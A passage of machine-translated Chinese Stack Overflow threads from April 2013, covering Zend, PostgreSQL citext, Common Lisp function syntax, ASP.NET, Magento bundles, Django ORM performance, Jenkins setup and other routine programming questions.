```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-10T22:07:22.633

这是一个覆盖视图助手的示例：

[http://ctrl-f5.net/php/zf2-servicemanager-custom-viewhelpers/](http://ctrl-f5.net/php/zf2-servicemanager-custom-viewhelpers/)

* * *

例子：

```
class Module {

    public function onBootstrap(MvcEvent $mvcEvent)
    {
        $application = $mvcEvent->getApplication();
        $serviceManager = $application->getServiceManager();
        $viewHelperManager = $serviceManager->get('ViewHelperManager');
        $viewHelperManager->setInvokableClass('formmulticheckbox', 'MyNamespace\Form\View\Helper\FormMultiCheckbox');
    }
    ...
} 
```

# ruby-on-rails-3 - 是否有 PostgreSQL 设置可用于对列值进行不区分大小写的查询？

> ID：15936808
> 
> 赞同：0
> 
> 时间：2013-04-10T21:32:05.043
> 
> 标签：ruby-on-rails-3, postgresql, activerecord, ruby-on-rails-3.2

我已经使用 MySQL 9 年了，现在有一个新的 Rails 3.2 应用程序，我在其中使用 PostgreSQL。我被我带到项目中的几个假设所困扰。

使用 MySQL，我可以设置数据库设置，以便：

```
plan = Plan.find_by_name("platinum") 
```

将返回一条记录，即使 db 中的值为`Platinum`. 使用 PostgreSQL 的默认设置，它不会那样工作。

我相信这一定是一个普遍的问题。我当然不希望我的客户必须输入完全匹配的大小写。由于某种原因，我在网上找不到任何东西，我只是在 PostgreSQL 的网站上找到了 10 年前不支持此功能的支持案例。希望它现在已经改变了。

## 解决了：

感谢下面的答案，这里是如何做到这一点：

在 Postgres 9.1+ 中，`citext`contrib 模块随代码一起提供。您需要做的就是在 psql 命令行中输入：

```
create extension citext 
```

现在您可以使用 citext 列类型创建表：

```
create table people (name ctext); 
```

插入一些行进行测试：

```
insert into people (name) values ('ADRIAN');
insert into people (name) values ('adrian'); 
```

并测试：

```
select * from people where name = 'Adrian'; 
```

结果：

```
 name  
--------
 adrian
 ADRIAN
(2 rows) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T23:27:50.777

`citext`您可以像使用[`citext`contrib 模块](http://www.postgresql.org/docs/current/static/citext.html)一样定义列。

另一种选择是不使用`ilike`通配符。如果存在，这仍将使用 b-tree 索引，`text_pattern_ops`如果不是默认 btree，则至少使用索引。您需要对[模式匹配](http://www.postgresql.org/docs/current/static/functions-matching.html)`LIKE`中记录的表达式元字符进行转义，以防止意外的通配符搜索。

Personally I'm really hoping to see a `COLLATE` option for case insensitivity added now that per-expression `COLLATE` is supported... but right now, that's hand-waving future stuff.

# lisp - Common Lisp 中的高阶函数语法

> ID：15936817
> 
> 赞同：5
> 
> 时间：2013-04-10T21:32:59.090
> 
> 标签：lisp, common-lisp

我正在使用 Norvig 的人工智能编程范式自学 Common Lisp，遇到了一些我不理解的东西，他也没有解释。

```
(defun mappend (fn the-list)
  (apply #'append (mapcar fn the-list))) 
```

如下调用高阶函数和不`higherOrderFunc #'funcName funcArg`调用时他做了什么有什么区别？调用高阶函数时有必要吗 ？`mapcar``#'``#'`

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-10T22:32:44.793

Common Lisp 对函数和变量有不同的命名空间。

```
(defun mappend (fn the-list)
   (apply #'append (mapcar fn the-list))) 
```

上面`MAPPEND`用两个局部变量定义`fn`，`the-list`

`APPLY`传递 的*函数*值`APPEND`。

`MAPCAR`传递 的*变量*值`FN`。

类似的看到这个：

```
CL-USER 129 >  (flet ((add-something (number)
                       (+ number 17)))
                (let ((add-something (lambda (number)
                                       (+ number 42))))
                  (list
                   (mapcar #'add-something '(1 2 3))
                   (mapcar add-something '(1 2 3)))))

->

((18 19 20) (43 44 45)) 
```

`LET`创建局部变量，`FLET`创建局部函数。

第一个`mapcar`使用函数命名空间，第二个使用变量命名空间。

Common Lisp 使用一个特殊的函数命名空间，因为它被认为更高效（实现快速 Lisp 稍微容易一些）并且允许函数和变量具有相同的名称。

在 Common Lisp 中，我们可以这样写：

```
(defun list-me (list)
  (list list)) 
```

在没有单独命名空间的 Scheme 中，可以这样写：

```
(define (list-me lst)
  (list lst)) 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-10T22:25:31.943

`#'`是`function`:的语法糖，`#'foo`读作`(function foo)`.

`Function`是一个特殊的运算符，它返回绑定到给定名称的函数值。如果您将函数作为参数传递，则该参数（在您的情况下为`fn`）将其值绑定到该函数。要将其传递给另一个函数，您只需将变量名放入调用表单即可。但是，要获取名称的函数值，您需要使用`function`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-10T23:22:12.017

使用`#'`不是严格要求。相反，如果您只是传递`'foo`符号函数，则会被调用。考虑以下：

```
* (defvar foo #'(lambda (a) 'var))
* (setf (symbol-function 'foo) #'(lambda (a) 'fun))

* (mapcar 'foo '(a b))
(FUN FUN)

* (mapcar #'foo '(a b))
(FUN FUN)

* (mapcar foo '(a b))
(VAR VAR) 
```

实际上 #'foo 或 'foo 是等价的：

> X3J13 投票 [...] 允许 'function' 使用唯一的 'symbol' 或 'function' 类型；[...] 必须在 lambda 表达式 [...] 之前使用“函数”特殊形式 [...]。

函数的规范`flet`有一些有趣的属性：

```
* (flet ((foo (a) 'FLET))
    (mapcar foo '(a b)))           ; Uses 'value' of foo
(VAR VAR)

* (flet ((foo (a) 'FLET))
    (mapcar 'foo '(a b)))          ; Uses 'function' of foo
(FUN FUN)

* (flet ((foo (a) 'FLET))
    (mapcar #'foo '(a b)))         ; Uses local binding 'flet' of foo
(FLET FLET) 
```

# asp.net - 直到第二次点击才会触发动态创建的按钮

> ID：15936820
> 
> 赞同：0
> 
> 时间：2013-04-10T21:33:08.447
> 
> 标签：asp.net, button, dynamic, click

我正在动态创建一个带有许多按钮的表格。目标是每次单击按钮时，它旁边的按钮都会改变颜色。但是，每次我点击一个按钮时，我点击的那个按钮都会改变它的颜色。只有在第二次单击后，它旁边的颜色才会改变。

我对此很陌生，而且我的英语不太好，所以如果你能把你的解释尽可能简单，那将是最好的。

这是代码：

```
protected void Page_Load(object sender, EventArgs e)
{
    Table tavla = new Table(); //New Table
    tavla.GridLines = GridLines.Both; //Gridlines
    tavla.BorderWidth = 4; //BorderWidth
    tavla.ID = "tbl1"; //Table ID
    Button btn = null; //New Button
    for (int i = 1; i <= 8; i++)
    {
        TableRow myline = new TableRow();
        for (int j = 1; j <= 8; j++)
        {

            TableCell ta = new TableCell();
            ta.HorizontalAlign = HorizontalAlign.Center;
            btn = new Button();
            btn.Width = 40;
            btn.Height = 30;
            btn.ID = i.ToString() + j.ToString();

            btn.Text = btn.ID.ToString();
            if ((btn.ID == "54") || (btn.ID == "45"))
            {
                btn.BackColor = Color.Black;
                btn.Text = btn.ID.ToString();
                btn.ForeColor = Color.Aqua;
            }
            else if ((btn.ID == "44") || (btn.ID == "55"))
            {
                btn.BackColor = Color.Red;
                btn.Text = btn.ID.ToString();
                btn.ForeColor = Color.Aqua;
            }

            else
            {
                btn.BackColor = Color.Empty;
                btn.ForeColor = Color.Black;
            }
            btn.Click += new EventHandler(Checking);
            ta.Controls.Add(btn);
            myline.Cells.Add(ta);

        }

        tavla.Rows.Add(myline);
    }

    Panel1.Controls.Add(tavla);

}

protected void Checking(object sender, EventArgs e)
{

    Button btn1 = sender as Button; // New button.
    btn1.ID = (int.Parse(btn1.ID) + 1).ToString(); // Button ID += 1
    btn1.BackColor = Color.Red; // Button changes color
    this.Label1.Text = btn1.ID.ToString(); //Label showing the ID of button clicked.

} 
```

最终结果：http: [//i50.tinypic.com/260frb9.png](http://i50.tinypic.com/260frb9.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T22:02:05.910

在检查方法中，您正在修改刚刚单击的按钮的ID，这是错误的。

你想要的是这样的（在我的脑海中，可能存在代码错误）：

```
protected void Checking(object sender, EventArgs e)
{
  Button btn1 = sender as Button; // New button.
  string nextId = (int.Parse(btn1.ID) + 1).ToString();
  Button nextBtn = btn1.Parent.FindControl(nextId) as Button;
  //check here to make sure nextBtn is not null :)
  nextBtn.BackColor = Color.Red; // Button changes color
  this.Label1.Text = btn1.ID.ToString(); //Label showing the ID of button clicked.

 } 
```

# statistics - 如何在 Pentaho Schema Workbench 中定义标准偏差函数

> ID：15936822
> 
> 赞同：2
> 
> 时间：2013-04-10T21:33:18.677
> 
> 标签：statistics, aggregate-functions, pentaho

我正在使用 Pentaho 的 BI Suite（社区版）构建 OLAP 分析。我的许多衡量标准都是事实表中变量的标准差。

有人对如何在 Schema Workbench 中定义标准偏差聚合函数有提示吗？我的很多工作都可以从中受益。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-11T06:59:17.557

您可以使用 MeasureExpression 这里有关于如何在 Postgresql 中执行此操作的指南，您的基础数据库是什么？

[http://blog.endpoint.com/2009/07/subverting-postgresql-aggregates-for.html](http://blog.endpoint.com/2009/07/subverting-postgresql-aggregates-for.html)

长期以来一直有支持自定义聚合器的请求，但尚未完成。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-12-01T14:45:12.423

在我的例子中，数据库有 3 行，MDX 立方体有 3124 个单元。

因此，MDX 函数将根据 3124 个单元格值计算标准偏差，而“真正的”统计学家通常会使用所有 3 个轧机行。

为了获得统计学家 STDDEV，我在数据库中添加了一个列，即行值的平方。

然后在蒙德里安我定义了一个新的度量标准，标准开发，如下：

( 平方和 - (平均值 * 平均值)) 的平方根

这对层次结构有一些影响，但这是另一回事。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-11T18:37:00.310

我现在如何计算标准偏差：

我创建了一个 ID 维度，而不是为了探索，只是为了确保 Mondrian 没有计算已经聚合的值的标准偏差。

然后我使用 MDX 公式创建了一个新的计算成员：Stddev(Descendants([ID_Dimension.ID_Hierarchy],,Leaves),[Measures].[Measure with values to be aggregated])。

性能很烂。

这个想法来自[这个](http://forums.pentaho.com/showthread.php?47177-Standard-Deviation)非常古老的论坛帖子。

# html - 如何在背景图片上方设置文字

> ID：15936825
> 
> 赞同：0
> 
> 时间：2013-04-10T21:33:45.797
> 
> 标签：html, css

我对元素背景图像有疑问。

我有以下内容：

```
<div class="element" style="background-image: url(http://1.png); border: thin solid rgb(31, 101, 155); background-size: 133px 106px; background-repeat: no-repeat;">
    <table class="title_table" cellpadding="0" cellspacing="0">
        <tbody>
            <tr>
                <td>Element Title</td>
            </tr>
        </tbody>
    </table>
</div> 
```

结构无法更改，我希望`Element Title`在背景图像上方显示“” `(1.png)`。目前，背景图片覆盖了“ `Element Title`”。

有没有办法做到这一点？非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:38:18.663

```
<table class="title_table" cellpadding="0" cellspacing="0" style="background-image: url(http://1.png);"> 
```

并使用`1.png`'s `width`& `height`for `table`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:39:52.270

您可以重新定位背景。

将此添加到您的样式中：

```
background-position: 0px 1.1em; 
```

它将背景向下推到行高的大小，并且稍微多一点，这样标题就不会碰到背景的顶部。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T21:53:31.147

我用不同的 url 重用你的代码：

```
<div class="element" style="background-image: url(http://profile.ak.fbcdn.net/hprofile-ak-ash4/273203_100004092323558_2118346675_n.jpg); border: thin solid rgb(31, 101, 155); background-size: 133px 106px; background-repeat: no-repeat;">
<table class="title_table" cellpadding="0" cellspacing="0">
    <tbody>
        <tr>
            <td>Element Title</td>
        </tr>
    </tbody>
</table> 
```

它仍然可以正常工作，请检查您的网址。

# php - Magento - 如何创建 1 个基本上链接到其他 2 个产品的产品？

> ID：15936835
> 
> 赞同：0
> 
> 时间：2013-04-10T21:34:21.297
> 
> 标签：php, magento, e-commerce, inventory-management

我的问题基本上是我有 2 种产品可以单独出售和一起出售。

我想要做的是拿这两个单独的项目，在 Magento 中为它创建一个新产品，并使用一个新图像将它们一起显示为一个组合价格。当这个特定的项目被出售时，它将减少创建的每个单独 sku 的数量。这可能吗？

举个例子，

SKU 1 - Wii 遥控器 - 30 美元 SKU 2 - Wii Nunchuk - 15 美元 SKU 3 - Wii 遥控器 + Nunhcuk - 45 美元

因此，当 sku 3 出售时，它将减少 sku 1 和 2 的数量。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T22:11:16.767

也许“捆绑”可以帮助你？

[http://www.magentocommerce.com/knowledge-base/entry/creating-a-bundled-product](http://www.magentocommerce.com/knowledge-base/entry/creating-a-bundled-product)

我不确定，因为我从未使用过 Magento。我刚刚用谷歌搜索了你的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-27T21:26:39.607

我不一定同意 magento 希望我们出售“捆绑包”的方式

它让用户决定他们想要组合哪些产品，它非常类似于“分组产品”。

对我来说，捆绑是由店主预先确定的，如果 A 与 B 和 C 一起购买，那么客户可以节省 X 金额......这不是由客户决定捆绑的一部分。

所以我最终创建了捆绑包，将捆绑包中我想要的所有产品添加为“多选”，将它们全部勾选为“默认”， ![捆绑](https://i.stack.imgur.com/ybrUO.png)

我用 CSS 隐藏选项，只显示价格和添加到购物车按钮（每个产品都有它自己的类）：`body.product-name #product-options-wrapper { display: none }`

因此，当然，如果您有数千个捆绑包，那么这对您不起作用。

我对这个解决方案非常满意，因为 1\. 它更新了库存 & 2\. 所有 SKU 都显示在发票上！（对我来说，它们也是批号）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-11T01:41:50.923

如果您的规则在以下范围内，捆绑产品就可以了：要记住的要点

```
A Bundle is a “build your own” product type
Bundle Items can be Simple or Virtual products, but without Custom Variants and Options
The Price View of a Bundle can be set to display a price range or “As Low as”
The SKU and Weight of a Bundle product can be set to either “Fixed” or “Dynamic”
Items can have either a preset or user-defined quantity
Items can be shipped together or separately
Bundle product data cannot be imported into your catalog. 
```

意味着：捆绑产品中不能有可配置的产品。因此，如果您的 SKU1 和 SKU2 不可配置，或者只是简单的或虚拟的，那么您可以创建捆绑产品并按照您所说的方式销售。

# c++ - 试图在 OS X 10.6 上安装 libxml++

> ID：15936846
> 
> 赞同：0
> 
> 时间：2013-04-10T21:34:52.030
> 
> 标签：c++, xcode, macos, libxml2

我是 C++ 新手，正在尝试为 libxml2 安装 C++ 绑定。

现在在这里待了大约四个小时后，我觉得这是在跟我开一个玩笑。我运行了 lixml++ 的配置脚本，它说我需要软件包 libxml-2.0 >= 2.7.3 glibmm-2.4 >= 2.32.0

所以我去获取 glibmm2.4 并运行配置脚本。它说我需要包：sigc++-2.0 >= 2.2.10 glib-2.0 >= 2.34.0 gobject-2.0 >= 2.34.0 gmodule-2.0 >= 2.34.0)

所以我去获取包 sigc++ 并运行配置脚本，它说我需要 glib-2.6。我下载了 glib-2.6 并运行了 configure，它说我需要 libffi。

我想你应该已经明白了。

我又经历了大约四个版本，并在此过程中遇到了错误。现在我真的接近放弃了。我肯定错过了什么。

虽然安装软件包令人兴奋，但我真的不想仅仅为了简单地使用 libxml++ 库而整天这样做。

请告诉我有比链上依赖链更好的解决方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-08-10T05:14:15.803

要`libxml++`在 mac 上安装，根据文档，您需要安装`libxml2`和`glibmm2.4`. 请参阅[libxml++ 网站](http://libxmlplusplus.sourceforge.net/)。

1.  安装`homebrew`. 如果您还没有，请参阅[自制软件的网站](https://brew.sh/)。

2.  运行`brew install libxml2`。

3.  运行`brew install glibmm`。
4.  运行`brew info libxml++`。

# java - 如何在我的 java 代码中找到文件

> ID：15936848
> 
> 赞同：0
> 
> 时间：2013-04-10T21:35:01.080
> 
> 标签：java, linux, file-io, directory, filepath

我被困在如何从我的 Java 程序中稳健地找到文件路径上。如果我使用的是 Linux，我可以从我的主文件夹启动我的程序，然后我不能说在 ./myProgram/myFile 中找到我的文件。无论我的控制台在哪个目录中，有没有找到我的文件的好方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:53:01.137

如果您尝试使用路径访问文件：

```
./myProgram/myFile 
```

在您的程序中，但您没有从`myProgram`目录执行程序，那么您的 Java 代码将看不到该文件。尝试为其提供完整路径而不是相对路径。如果`myProgram`是在您的用户的 Documents 目录中找到的目录，则完整路径可能如下所示：

```
/home/*username*/Documents/myProgram/myFile 
```

您还可以内置功能，让您通过浏览目录并列出文件来选择文件。这将为用户提供选择在程序中使用哪个文件的选项。

您也可以在执行文件之前`cd`进入`myProgram`目录，然后相对路径`./myProgram/myFile`应该可以工作。

希望有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T23:17:10.183

试试这个：

```
File f = new File(System.getProperty("user.home") + System.getProperty("file.separator") + "myFile.txt"); 
```

# jquery - jQuery：测试元素是否在屏幕上可见

> ID：15936849
> 
> 赞同：4
> 
> 时间：2013-04-10T21:35:02.967
> 
> 标签：jquery, html, css

* * *

**注意**：这*不是*关于`display:none;`.

* * *

我在各种容器中有不同的元素，它们是 set `overflow:auto;`。我想测试浏览器中是否可以看到任何给定的元素。

精度：

*   我假设（阅读“我不在乎”）顶部没有浮动的绝对元素
*   容器可能是绝对的
*   该元素可能部分可见

此函数将在`window`（或任何可滚动的）滚动事件上调用，以检查元素是否在视口中消失或重新出现，并且观察到的元素可能位于可滚动的 DIV 内。

推广这种验证是否需要做太多工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T05:55:56.720

如果元素在指定容器中可见，这将返回 true：

```
function isVisable( element, container ){

  var elementTop = $(element).offset().top,
      elementHeight = $(element).height(),
      containerTop = $(container).offset().top,
      containerHeight = $(container).height();

  return ((((elementTop - containerTop) + elementHeight) > 0)
         && ((elementTop - containerTop) < containerHeight));
} 
```

[http://jsfiddle.net/MPuDW/](http://jsfiddle.net/MPuDW/)

# authentication - 对单个 OpenID 提供程序进行硬编码的注意事项？

> ID：15936851
> 
> 赞同：1
> 
> 时间：2013-04-10T21:35:12.117
> 
> 标签：authentication, openid

我们正在考虑在我们的 Django Web 应用程序（我们将其称为网站 1）和另一个特定网站（网站 2）之间进行单点登录的一些选项。我们的两个首要任务是：

*   易于实施/维护。
*   避免我们登录过程的复杂性（我们的观众根本不精通技术）。换句话说，我什至不希望他们知道 OpenID 是什么。不过，他们知道使用来自网站 2 的凭据。

OpenID 有大量的 Django 应用程序，但我们不希望我们的用户选择他们的提供者（我们希望强制他们使用他们的“网站 2”凭据）。**这是我最关心的问题：我可以对提供者进行硬编码，以便他们始终使用“网站 2”作为权限吗？**

到目前为止，这是我的研究似乎认为的流程：

*   用户进入登录页面。我们要么显示一个按钮让他们点击登录，要么我们只是说“我们将把你重定向到站点 X 进行身份验证”并在几秒钟后这样做。
*   用户被重定向到网站 2。他们输入他们的凭据并被重定向回我们。
*   用户不知道/不在乎刚刚发生了什么，我们有一些简单的东西可以快速启动。

我在正确的轨道上吗？这甚至可能吗？你看到任何警告吗？

# javascript - jQuery 从表格行元素中删除一个 div

> ID：15936854
> 
> 赞同：0
> 
> 时间：2013-04-10T21:35:29.547
> 
> 标签：javascript, jquery, html, backbone.js

我想将特定位置的一些表格单元格插入表格中，所以我用 标记这个位置，例如

```
<tr>
  <td>first</td>
  <div class='insert-here'></div>
  <td>last</td>
</tr> 
```

但是，jquery 会删除应该包含的 div，例如

```
$('<tr><div class="asd"></div></tr>') returns [<tr></tr>] 
```

简单的解决方案是标记第一个单元格并在此之后插入。由于我使用的是主干视图，因此视图将具有整行的上下文，而不仅仅是其单元格。

有没有人想出一个很好的解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:37:54.433

`<tr>`元素*只能*包含`<td>`或`<th>`元素作为子元素。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:37:43.467

像这样的东西？

```
 $("tr td .insert-here").before("<div id='new_div'>helo</div>");
 $("tr td .insert-here").remove(); 
```

# javascript - 在 Chrome 中捕获 JS 错误

> ID：15936856
> 
> 赞同：5
> 
> 时间：2013-04-10T21:35:39.193
> 
> 标签：javascript, google-chrome, testing, selenium, selenium-webdriver

我正在使用 捕获应用程序中的 js 错误`window.onerror`，但问题是 - 在 Chrome 中，如果未打开开发工具 - 那么`url`传递给`onerror`处理程序的参数始终等于打开的 url。

而如果打开开发工具 - 那么`url`指向确切`.js`文件的点会导致 js 错误。

你如何解决？有什么解决方法吗？

更清楚的是 - 这里有 2 个结果：

1.  `Uncaught ReferenceError: a is not defined index:122`- 这是在获取页面后收到的
2.  `Uncaught ReferenceError: a is not defined List.js:122`- 这是在打开开发工具的情况下获取同一页面后收到的。这是预期的结果 - 我已`a();`调用`List.js`文件进行测试。

**UPD**：这是为功能测试（使用 selenium webdriver）而完成的 - 我想捕获 js 错误以进行进一步调查。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T22:05:00.140

更多的*东西可以尝试*回答，但它可能会有所帮助。

Chrome 最近添加`chrome://inspect/`到了方便的 URL 列表中（请参阅`chrome://chrome-urls/`完整列表）。不幸的是，我找不到我读到的关于此的推文或博客文章，但我认为它是在上个月内。该 URL 肯定适用于 Chrome 28。

`chrome://inspect/`列出所有打开的选项卡，并带有一个**检查**链接，该链接重定向回现有的打开页面，但也会打开 DevTools。

我认为 selenium 测试可以在一个选项卡中打开被测站点，并在第二个选项卡中打开*检查*页面，按照`inspect`链接返回测试页面，但这次打开 DevTools，允许`window.onerror`捕获更好的错误。

就像是：

```
document.getElementsByClassName('row')[n].getElementsByTagName('a')[0].click() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T22:12:15.257

让我们提出以下架构：

```
window.addEventListener("error", handleException, false);

function handleException(I_sMsg) {

    if (I_sMsg.stack) {
            sMsg = I_sMsg.stack.replaceAll(getBaseURL(), "");
        alert(sMsg);
    } else if (I_sMsg.message) {
        alert(I_sMsg.message);
    }   

    return cancelEvent(I_sMsg);
} 
```

现在 any`throw new Error("description");`将通过 if 语句的第一部分，并有一个很好的堆栈供您使用 url 解析。

它也适用于意外异常，因此会出现以下消息（在这种情况下，在调用不存在的`bibi()`函数之后）

![意外异常的屏幕截图](https://i.stack.imgur.com/pgpM2.png)

经过进一步调查，我的框架正在使用某种自制的作业管理（实际上如堆栈中所示），其中每个操作都属于一个作业。

作业执行方式如下（简化）

```
 try {
        oTask.func.apply(oTask.obj, oTask.prms);
    } catch(ex) {
        handleException(ex);
        return false;
    } 
```

所以这意味着每一次执行都被封装在这个单一的 try catch 块中。如您所见，**异常**被捕获并传递给处理程序。不是**错误**。

我虽然它在另一个文件中工作，但这是因为调用被封装，而直接在 api.js 文件中它是一个不受框架管理的免费调用。

# django - Django 中页面生成缓慢，每页 50 多个 sql 查询

> ID：15936859
> 
> 赞同：-1
> 
> 时间：2013-04-10T21:35:47.807
> 
> 标签：django, django-models, django-orm

在我的 Django 应用程序中，我注意到具有大量 sql 查询的页面的加载速度比其他页面慢得多。我不是 web 开发的第一天，主要是我与 Drupal 这样的资源大猪打交道，但即使是每页 150 到 200 个 sql 查询的 Drupal 也会在 0.5 到 0.7 秒内生成页面。

另一方面，Django 在每页平均查询数或多或少的情况下表现非常糟糕。例如，我的一个页面会生成 60 个这样的查询：

```
SELECT`gamenode_gamenode`.`id`, `gamenode_gamenode`.`title`, `gamenode_gamenode`.`short_desc`, `gamenode_gamenode`.`full_desc`, `gamenode_gamenode`.`slug`, `gamenode_gamenode`.`type`, `gamenode_gamenode`.`source_gameid`, `gamenode_gamenode`.`created`, `gamenode_gamenode`.`updated`, `gamenode_gamenode`.`status`, `gamenode_gamenode`.`promote`, `gamenode_gamenode`.`sticky`, `gamenode_gamenode`.`hit_count`, `gamenode_gamenode`.`game_rank`, `gamenode_gamenode`.`share_count`, `gamenode_gamenode`.`like_count`, `gamenode_gamenode`.`comment_count` FROM `gamenode_gamenode` WHERE `gamenode_gamenode`.`id` = 1058 
```

并将数据输出为一个简单的字符串，生成一个页面需要 1200 毫秒！我这样做只是为了进行测试以生成许多相当简单的查询。如果我将查询数量降低到 10 - 15，页面生成时间将恢复到或多或少可以接受的数字。

所以我有一个问题，为什么页面上有很多sql查询时，Django会这么慢？我使用 Rails、Symfony 和 Drupal 进行了类似的比较，所有这些“资源消耗者”的表现都比 Django 好得多。我是不是做错了什么，或者有一些“秘密”设置可以让 Django 中的事情变得更快，或者，也许 Djangonauts 认为这样的时间是正常的，只是努力编写产生尽可能少的查询的代码？请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-11T09:55:20.227

是的，Django 的 ORM 很慢。您有三种选择来处理这个问题：

1.  投诉它。

2.  切换到另一个 Web 应用程序框架。

3.  努力理解为什么您的应用程序会生成如此多的数据库查询，并学习如何有效地使用 Django 的 ORM 以减少查询次数。

(1) 可能在心理上令人满意，但不能解决你的问题；(2) 在 Stack Overflow 上是题外话（但您可以查看 Wikipedia's [Comparison of web application frameworks](http://en.wikipedia.org/wiki/Comparison_of_web_application_frameworks)）。

我们*可以*在 (3) 方面为您提供帮助，但前提是您向我们展示更多代码。您引用的查询看起来像 Django 为调用生成的典型查询[`get()`](https://docs.djangoproject.com/en/1.5/ref/models/querysets/#django.db.models.query.QuerySet.get)：

```
GameNode.objects.get(id = 1058) 
```

你不应该在一个页面上运行超过几个这样的查询：如果你想得到很多`GameNodes`，你需要在一个查询中得到它们：

```
GameNode.objects.filter(<criteria>) 
```

或者，如果`GameNode`对象通过您正在查询的另一个模型上的外键与其他对象相关，那么您可以`GameNode`使用 Django 获取所有相关对象[`select_related()`](https://docs.djangoproject.com/en/1.5/ref/models/querysets/#django.db.models.query.QuerySet.select_related)方法获取所有相关对象。

几乎总有一种方法可以加快速度（[请参阅this testimonial](http://blog.mozilla.org/webdev/2011/12/15/django-optimization-story-thousand-times-faster/)），但我们需要先了解细节，然后才能说出如何去做。

# c# - 我如何继承这个公共抽象类 BusinessBase : IDisposable where TYPE : BusinessBase ， 新的（）

> ID：15936860
> 
> 赞同：0
> 
> 时间：2013-04-10T21:35:51.080
> 
> 标签：c#, .net, inheritance, abstract-class

我正在做一个项目，似乎无法弄清楚如何继承以下基类

```
public abstract class BusinessBase<TYPE, KEY> : IDisposable
    where TYPE : BusinessBase<TYPE, KEY>, new() 
```

我认为以下方法可行，但出现编译错误

```
public class Buisness{
    Business(){}
}

public class BusinessModel : BusinessBase<Business,int>
{

} 
```

IDisposable 可以是任何其他接口。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:43:11.717

```
public class BusinessModel : BusinessBase<Business,int> 
```

`BusinessBase.TYPE`是`Buisness`。`BusinessBase`需要`TYPE`实现的规范，`BusinessBase<>`但是您没有显示`Buinesss`实现任何类。

看来，意图是：

```
public class BusinessModel : BusinessBase<BusinessModel,int> 
```

这将满足`TYPE`a 的要求`BusinessBase`。

另请注意，鉴于上述定义，以下内容也适用：

```
public class OtherModel : BusinessBase<BusinessModel, int> 
```

顺便说一句，关于这在哪里有用的参考，`IEquatable<T>`通常是为与实现它的类相同的类型实现的。例如`Foo : IEquatable<Foo>`. 如果不查看源代码，`BusinessBase`我无法确定他们为什么需要它。

# iphone - 将此更改为设置的像素宽度

> ID：15936862
> 
> 赞同：0
> 
> 时间：2013-04-10T21:35:54.973
> 
> 标签：iphone, ios

这可能非常简单，但我无法让它正常工作。我正在尝试通过将图像调整大小选项更改为设置的像素大小来对我的 iOS 应用程序进行简单更新。下面的代码是我正在使用的代码以及它当前的运行方式：

selectedWidth = (30 * selectedWidth)/100;

selectedHeight = (30 * selectedHeight)/100;

我假设这是 100% 的 30%？我只需要选择的宽度为 200 像素，高度为自动。有人能帮帮我吗？我是这种编码的新手，我的开发人员不在，我认为这将是一个简单的改变哈哈。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:49:22.040

因此，如果我理解正确，我认为这可能会有所帮助

```
selectedHeight = (selectedHeight / selectedWidth) * 200;
selectedWidth = newWidth; 
```

这应该计算出 200px 宽度的正确高度。

如果您想不时更改您的固定宽度，您可以在导入下方的 m.file 中定义一个常量变量：

```
#define kWidth 200 
```

并使用它而不是顶部代码中的硬编码 200。

**例子：**

旧宽度：100px 旧高度：50px

新宽度：200px 新高度：(50 / 100) * 200 = 100px

# jenkins - 詹金斯山狮服务器

> ID：15936866
> 
> 赞同：4
> 
> 时间：2013-04-10T21:36:03.410
> 
> 标签：jenkins, localhost, osx-mountain-lion

我试图让 Jenkins (1.510) 在我的 MacMini 上运行，并安装了最新的 Mountain-Lion Server OSX (10.8.3)。在 MacMini-server 上，我有两个用户：admin、ioscoder 和我登录的 ioscoder 用户，打开 jenkins-1.510.pkg 并在输入管理员密码后安装没有问题。但是，当 Jenkins 主页出现时，使用 localhost:8080，我在 Safari 中收到以下错误消息：

```
Safari can't open the page "http://localhost:8080/" because Safari can't connect to the server "localhost". 
```

以管理员身份登录并检查当前正在运行的服务，即 DNS、Open Directory、网站（禁用 PHP 和 Python Web 应用程序）后，在输入 Jenkins 地址 localhost:8080 时，我也从上面得到相同的错误。当我切换到管理员用户时，我在欢迎屏幕上看到了一个 Jenkins 用户帐户，它是由 jenkins-installer 包创建的。

真正让我感到困惑的是，在另一台运行 Mountain Lion（不是 Mountain Lion 的服务器版本）的 iMac 上，我以相同的方式安装了 Jenkins，安装完成后，我立即得到了一个正在运行的 Safari，它将 localhost:8080 解析为 Jenkins主屏幕。

为什么 Jenkins 没有在 Mountain Lion 服务器设备上运行的任何想法或建议？谷歌搜索这个特定问题还没有给我任何线索。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-10T21:47:19.193

在阅读了提到简单安装的[https://wiki.jenkins-ci.org/display/JENKINS/Meet+Jenkins](https://wiki.jenkins-ci.org/display/JENKINS/Meet+Jenkins)页面（java -jar jenkins.war）后，我记得 java 可能没有默认安装在清洁山狮服务器。激活终端并输入后：

```
